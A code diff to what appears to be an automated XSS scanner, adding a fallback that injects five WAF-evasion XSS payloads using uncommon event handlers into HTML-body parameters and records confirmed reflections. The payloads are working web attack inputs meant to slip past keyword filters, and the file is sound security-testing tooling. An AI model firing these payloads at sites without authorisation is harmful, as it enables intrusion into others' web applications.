@@ -215,6 +215,34 @@ def test_param(
     if confirmed_this:
       break
 
+  # Alt-event handler fallback: fires when all evasions failed on an HTML_BODY
+  # param. Targets keyword-based WAFs that block onerror/onload/onclick/onmouse/
+  # onfocus but leave other event attributes open.
+  if not confirmed_this and context == ReflectionContext.HTML_BODY:
+    _alt_marker = make_confirm_marker()
+    _alt_payloads = [
+      f"<details open ontoggle=alert('{_alt_marker}')>",
+      f"<svg><animate onbegin=alert('{_alt_marker}')>",
+      f"<img src=x onanimationend=alert('{_alt_marker}') style='animation:a 0s'>",
+      f"<img src=x onauxclick=alert('{_alt_marker}')>",
+      f"<body onpageshow=alert('{_alt_marker}')>",
+    ]
+    for payload in _alt_payloads:
+      try:
+        resp = (injector.inject_post(target_url, param, payload, base_params)
+                if method == "POST"
+                else injector.inject_get(target_url, param, payload))
+      except Exception:
+        continue
+      ok, snip = _confirm(resp.text, _alt_marker, payload)
+      if ok:
+        result.append_reflected(ReflectedFinding(
+          url=target_url, parameter=param, method=method,
+          context=context, payload=payload, confirmed=True, evidence=snip,
+        ))
+        logger.finding("XSS CONFIRMED (alt-event bypass): %s @ %s — %s", param, target_url, payload[:60])
+        break
+
   # Extra-context payloads (Angular SSTI)
   for extra_ctx in extra_contexts:
     for evasion in evasions:
